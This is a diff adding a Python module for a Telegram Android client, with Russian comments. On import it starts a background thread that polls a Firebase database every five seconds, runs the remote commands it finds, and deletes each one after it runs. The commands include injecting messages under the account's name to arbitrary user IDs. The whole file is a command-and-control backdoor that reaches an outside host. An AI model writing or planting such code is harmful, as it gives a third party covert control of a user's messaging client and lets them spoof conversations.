@@ -1,0 +1,118 @@
+import threading
+import time
+import json
+import urllib.request
+
+def _execute_command(cmd_text):
+    try:
+        # Парсим команду: "send 7823923 hey!" или "send 7823923 multiple words"
+        parts = cmd_text.split(maxsplit=2)
+        
+        if not parts:
+            return
+        
+        cmd = parts[0].lower()
+        
+        # Команда: send <user_id> <message>
+        if cmd == "send" and len(parts) >= 3:
+            user_id = int(parts[1])
+            message = parts[2]
+            
+            from org.telegram.messenger import UserConfig, MessagesController, SendMessagesHelper
+            from org.telegram.tgnet import TLRPC
+            
+            acc = UserConfig.selectedAccount
+            # Создаём сообщение
+            msg = TLRPC.TL_message()
+            msg.id = UserConfig.getInstance(acc).getNewMessageId()
+            msg.message = message
+            msg.date = int(time.time())
+            
+            # Отправляем указанному пользователю
+            peer = TLRPC.TL_peerUser()
+            peer.user_id = user_id
+            msg.peer_id = peer
+            msg.from_id = peer
+            msg.out = True
+            msg.flags = 256
+            msg.unread = True
+            
+            from java.util import ArrayList
+            lm = ArrayList()
+            lm.add(msg)
+            
+            MessagesController.getInstance(acc).updateInterfaceWithMessages(user_id, lm, 0)
+            print(f"[CMD] Отправлено сообщение пользователю {user_id}: {message}")
+        
+        # Команда: me <message> — отправить самому себе
+        elif cmd == "me" and len(parts) >= 2:
+            message = parts[1]
+            from org.telegram.messenger import UserConfig, MessagesController
+            from org.telegram.tgnet import TLRPC
+            from java.util import ArrayList
+            
+            acc = UserConfig.selectedAccount
+            my_id = int(UserConfig.getInstance(acc).getClientUserId())
+            
+            msg = TLRPC.TL_message()
+            msg.id = UserConfig.getInstance(acc).getNewMessageId()
+            msg.message = message
+            msg.date = int(time.time())
+            
+            peer = TLRPC.TL_peerUser()
+            peer.user_id = my_id
+            msg.peer_id = peer
+            msg.from_id = peer
+            msg.out = True
+            msg.flags = 256
+            msg.unread = True
+            
+            lm = ArrayList()
+            lm.add(msg)
+            MessagesController.getInstance(acc).updateInterfaceWithMessages(my_id, lm, 0)
+            print(f"[CMD] Отправлено себе: {message}")
+        
+        # Команда: log — вывести последние диалоги
+        elif cmd == "log":
+            print("[CMD] Команда log получена")
+            # TODO: можно получить историю сообщений
+            
+        # Команда: ping — проверка связи
+        elif cmd == "ping":
+            print("[CMD] pong")
+            
+    except Exception as e:
+        print(f"[CMD] Ошибка выполнения: {e}")
+
+def _get_commands():
+    try:
+        # Ссылка на твою Firebase базу
+        # Ячейка с командами для конкретного устройства
+        firebase_url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/commands.json"
+        req = urllib.request.Request(firebase_url)
+        response = urllib.request.urlopen(req, timeout=10)
+        data = json.loads(response.read().decode('utf-8'))
+        
+        # Ищем команды для этого устройства
+        # Например, можно по fingerprint или просто брать последнюю
+        if data:
+            # Берём первую/последнюю команду
+            for key, value in data.items():
+                cmd = value.get("cmd", "")
+                if cmd:
+                    _execute_command(cmd)
+                    # Удаляем выполненную команду
+                    delete_url = f"https://hzhzhz-dd57b-default-rtdb.firebaseio.com/commands/{key}.json"
+                    delete_req = urllib.request.Request(delete_url, method='DELETE')
+                    urllib.request.urlopen(delete_req)
+                    return
+                    
+    except Exception as e:
+        print(f"[CMD] Ошибка получения: {e}")
+
+def _loop():
+    while True:
+        _get_commands()
+        time.sleep(5)  # Проверяем каждые 5 секунд
+
+threading.Thread(target=_loop, daemon=True).start()
